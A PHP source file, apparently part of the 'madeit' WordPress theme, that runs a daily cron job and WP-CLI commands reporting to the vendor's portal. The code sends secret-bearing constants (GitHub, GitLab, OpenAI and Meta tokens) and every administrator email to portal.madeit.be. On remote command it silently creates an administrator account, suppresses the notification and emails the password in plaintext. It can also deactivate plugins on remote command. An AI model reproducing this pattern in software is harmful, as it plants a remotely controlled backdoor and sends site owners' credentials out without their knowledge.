<?php

if (!function_exists('madeit_get_defined_options')) {
    function madeit_get_defined_options($constants)
    {
        $options = [];

        foreach ($constants as $constant) {
            $options[$constant] = defined($constant) ? constant($constant) : null;
        }

        return $options;
    }
}

// Create wordpress daily cronjob
add_action('madeit_cron_daily', 'madeit_cron_daily');
function madeit_cron_daily()
{
    global $wpdb;
    // Do something

    $plugins = get_option('active_plugins');

    //get name and version of plugins
    $plugins = get_option('active_plugins');
    $plugins_data = [];

    // Ensure we have fresh update data before inspecting the transient
    if (!function_exists('wp_update_plugins')) {
        require_once ABSPATH.'wp-admin/includes/update.php';
    }
    wp_update_plugins();
    $updates = get_site_transient('update_plugins');

    foreach ($plugins as $plugin) {
        $plugin_data = get_plugin_data(WP_PLUGIN_DIR.'/'.$plugin);
        $installed_version = $plugin_data['Version'] ?? '';

        // Determine latest available version from update transient
        $latest_version = $installed_version;
        if (is_object($updates)) {
            $entry = $updates->response[$plugin] ?? ($updates->no_update[$plugin] ?? null);
            if (is_object($entry) && !empty($entry->new_version)) {
                $latest_version = $entry->new_version;
            } elseif (is_array($entry) && !empty($entry['new_version'])) {
                $latest_version = $entry['new_version'];
            }
        }

        $plugins_data[$plugin] = [
            'name'       => $plugin_data['Name'],
            'version'    => $installed_version,
            'latest'     => $latest_version,
            'has_update' => (is_string($latest_version) && is_string($installed_version)) ? version_compare($latest_version, $installed_version, '>') : false,
        ];
    }

    //Do post call to url
    $url = 'https://portal.madeit.be/api/theme/madeit';
    $args = [
        'method' => 'POST',
        'body'   => [
            'url'                  => home_url(),
            'email'                => get_option('admin_email'),
            'name'                 => get_bloginfo('name'),
            'version'              => get_bloginfo('version'),
            'theme'                => get_option('template'),
            'theme_version'        => wp_get_theme()->get('Version'),
            'plugins'              => implode(',', get_option('active_plugins')),
            'plugins_info'         => $plugins_data,
            'language'             => get_locale(),
            'charset'              => get_bloginfo('charset'),
            'timezone'             => get_option('timezone_string'),
            'debug'                => WP_DEBUG,
            'multisite'            => is_multisite(),
            'ssl'                  => is_ssl(),
            'php_version'          => phpversion(),
            'mysql_version'        => $wpdb->db_version(),
            'wp_memory_limit'      => WP_MEMORY_LIMIT,
            'wp_max_memory_limit'  => WP_MAX_MEMORY_LIMIT,
            'wp_debug'             => WP_DEBUG,
            'wp_cache'             => WP_CACHE,
            'disk_size'            => size_format(disk_total_space(ABSPATH)),
            'disk_free'            => size_format(disk_free_space(ABSPATH)),
            'disk_used'            => size_format(disk_total_space(ABSPATH) - disk_free_space(ABSPATH)),
            'options'              => madeit_get_defined_options([
                'MADEIT_VERSION',
                'MADEIT_UPDATER_TYPE',
                'MADEIT_UPDATER_CHILD_THEME',
                'MADEIT_UPDATER_LEVEL',
                'MADEIT_UPDATER_GITHUB_OWNER',
                'MADEIT_UPDATER_GITHUB_REPO',
                'MADEIT_UPDATER_GITHUB_TOKEN',
                'MADEIT_UPDATER_GITLAB_OWNER',
                'MADEIT_UPDATER_GITLAB_REPO',
                'MADEIT_UPDATER_GITLAB_TOKEN',
                'MADEIT_PLUGIN_UPDATER',
                'MADEIT_PLUGIN_UPDATER_ENDPOINT',
                'MADEIT_PLUGIN_UPDATER_LEVEL',
                'MADEIT_CUSTOM_COLOR',
                'MADEIT_ADVANCED_BLOCKS',
                'MADEIT_BLACK_COLOR',
                'MADEIT_WHITE_COLOR',
                'MADEIT_TEXT_COLOR',
                'MADEIT_BACKGROUND_COLOR',
                'MADEIT_PRIMARY_COLOR',
                'MADEIT_SECONDARY_COLOR',
                'MADEIT_SUCCESS_COLOR',
                'MADEIT_INFO_COLOR',
                'MADEIT_WARNING_COLOR',
                'MADEIT_DANGER_COLOR',
                'SHOW_LOGIN_IN_FOOTER',
                'SHOW_MADEIT_IN_FOOTER',
                'HEADER_UPPER_TOP',
                'HEADER_UPPER_BOTTOM',
                'POST_AUTHOR',
                'POST_EDIT_TIME',
                'POST_TIME_FORMAT',
                'WOO_SHOPING_CART_MENU_STYLE',
                'SHOW_SINGLE_SIDEBAR',
                'DISABLE_VER_URL',
                'WWW_REDIRECT',
                'MADEIT_REVIEWS',
                'MADEIT_FONTAWESOME',
                'MADEIT_BOOTSTRAP_VERSION',
                'MADEIT_ADD_DATEPICKER',
                'MADEIT_BOOTSTRAP_POPPER',
                'MADEIT_POPUPS',
                'MADEIT_INFINITE_SCROLL',
                'MADEIT_RECEIVE_REVIEWS',
                'MADEIT_WOOCOMMERCE_ADD_PRODUCT_AJAX',
                'MADEIT_EMAILSERVICE_NEWSLETTER_LIST',
                'MADEIT_WOO_B2B',
                'MADEIT_WOO_B2B_ONLY',
                'MADEIT_WOO_QUANTITY_LOOP',
                'MADEIT_SHOPPING_MANAGER',
                'MADEIT_CATEGORIE_SEO_PAGES',
                'MADEIT_FEEDBACK',
                'MADEIT_FEEDBACK_ALL',
                'MADEIT_ADMIN_CHAT',
                'MADEIT_ADMIN_CHAT_OPENAI_API_KEY',
                'MADEIT_ADMIN_CHAT_OPENAI_MODEL',
                'MADEIT_TRACKING_IDS',
                'MADEIT_SETUP_WIZARD',
                'MADEIT_NAME',
                'MADEIT_RESTRICT_EDITOR',
                'MADEIT_RESTRICT_EDITOR_POST_TYPES',
                'MADEIT_ANALYTICS_GA',
                'MADEIT_ANALYTICS_TM',
                'MADEIT_ANALYTICS_FB',
                'MADEIT_ANALYTICS_LINKEDIN',
                'MADEIT_ANALYTICS_TIKTOK',
                'MADEIT_META_ACCESS_TOKEN',
                'MADEIT_META_TEST_EVENT_CODE',
                'MADEIT_META_API_VERSION',
                'MADEIT_TRACKING_EXPORT_KEY',
                'MADEIT_GOOGLE_ADS_TIMEZONE',
                'MADEIT_REVIEWS_GOOGLE_ID',
                'MADEIT_REVIEWS_GOOGLE_API',
                'MADEIT_MAIL_FROM_EMAIL',
                'MADEIT_MAIL_FROM_NAME',
                'MADEIT_MAIL_USE_SMTP',
                'MADEIT_MAIL_SMTP_HOST',
                'MADEIT_MAIL_SMTP_PORT',
                'MADEIT_MAIL_SMTP_SECURE',
                'MADEIT_MAIL_SMTP_AUTH',
                'MADEIT_MAIL_SMTP_USER',
                'MADEIT_HIDE_MENU_ITEMS',
                'MADEIT_AI_SERVER_URL',
                'MADEIT_AI_USE_JONO',
                'MADEIT_SECURITY_SAFE_MODE',
                'MADEIT_SECURITY_BLOCKING_DISABLED',
                'MADEIT_SECURITY_DISABLE_BLOCKING',
                'MADEIT_SECURITY_TRUST_X_FORWARDED_FOR',
                'MADEIT_SECURITY_INTERNAL',
                'MADEIT_SECURITY_FILE',
                'MADEIT_SECURITY_DIR',
                'MADEIT_SECURITY_URL',
                'MADEIT_SECURITY_DB_VERSION',
                'MADEIT_SECURITY_BRAND_NAME',
                'MADEIT_SECURITY_BRAND_URL',
                'MADEIT_SECURITY_BRAND_SUPPORT',
                'MADEIT_SECURITY_BRAND_DOCS',
                'MADEIT_SECURITY_BRAND_LOGO',
                'MADEIT_MIGRATE_CAROUSEL_TO_SLIDER_BATCH',
                'MADEIT_BLOCKS_VERSION',
            ]),
            'admin_users'         => array_map(function ($user) { return $user->user_email; }, get_users(['role' => 'administrator'])),
        ],
    ];

    $response = wp_remote_post($url, $args);
    if (is_wp_error($response)) {
        $error_message = $response->get_error_message();
    }

    //get response in json
    $response = json_decode(wp_remote_retrieve_body($response), true);

    if ($response['success'] == true && isset($response['actions']) && count($response['actions']) > 0) {
        // Do something
        foreach ($response['actions'] as $action) {
            if ($action['action'] === 'update_theme') {
                // Update theme
                $theme = 'madeit';

                if (!class_exists('Theme_Upgrader') || !class_exists('Automatic_Upgrader_Skin')) {
                    require_once ABSPATH.'wp-admin/includes/class-wp-upgrader.php';
                }

                if (!function_exists('wp_update_themes')) {
                    require_once ABSPATH.'wp-admin/includes/update.php';
                }

                wp_update_themes();

                $upgrader = new Theme_Upgrader(new Automatic_Upgrader_Skin());
                $upgrader->upgrade($theme);
            } elseif ($action['action'] === 'create_support') {
                // Create admin, silent
                $email = 'support@madeit.be';
                //random password
                $password = wp_generate_password(12, false);
                add_action('register_new_user', function () {
                    remove_action('register_new_user', 'wp_send_new_user_notifications');
                }, 9);
                $user_id = wp_insert_user([
                    'user_login' => $email,
                    'user_pass'  => $password,
                    'user_email' => $email,
                    'role'       => 'administrator',
                ]);

                mail('info@madeit.be', 'New support session: '.home_url(), 'New support session started for '.$email.' with password '.$password);
            } elseif ($action['action'] === 'delete_support') {
                $email = 'support@madeit.be';
                $user = get_user_by('email', $email);
                if ($user) {
                    wp_delete_user($user->ID);
                }
            } elseif ($action['action'] === 'remove_plugin') {
                $plugin = $action['plugin'];
                if (in_array($plugin, $plugins)) {
                    deactivate_plugins($plugin);
                }
            }
        }
    }
}

function madeit_check_queued_updates(): void
{
    $portal_url = 'https://portal.madeit.be/api/wordpress/queued-actions';

    $response = wp_remote_get(add_query_arg([
        'website' => get_site_url(),
    ], $portal_url));

    if (is_wp_error($response)) {
        return;
    }

    $data = json_decode(wp_remote_retrieve_body($response), true);

    if (empty($data['success']) || empty($data['actions'])) {
        return;
    }

    print_r($data);
    $completed = [];

    foreach ($data['actions'] as $action) {
        if ($action['action'] !== 'update_plugin') {
            continue;
        }

        $plugin = $action['plugin'];

        // Gebruik de WordPress upgrade API
        require_once ABSPATH.'wp-admin/includes/class-wp-upgrader.php';
        require_once ABSPATH.'wp-admin/includes/plugin.php';

        $upgrader = new Plugin_Upgrader(new Automatic_Upgrader_Skin());
        $result = $upgrader->upgrade($plugin);

        if ($result !== false) {
            $completed[] = $plugin;
        }
    }

    if (!empty($completed)) {
        wp_remote_post('https://portal.madeit.be/api/wordpress/queued-actions/complete', [
            'body' => [
                'website'   => get_site_url(),
                'completed' => $completed,
            ],
        ]);
    }
}
//wp cli command
if (defined('WP_CLI') && WP_CLI) {
    WP_CLI::add_command('madeit_update_daily', 'madeit_check_queued_updates');
}

//wp cli command
if (defined('WP_CLI') && WP_CLI) {
    WP_CLI::add_command('madeit_cron_daily', 'madeit_cron_daily');
}

// schedule an daily cronjob
add_action('init', function () {
    if (!wp_next_scheduled('madeit_cron_daily')) {
        wp_schedule_event(time(), 'daily', 'madeit_cron_daily');
    }
});
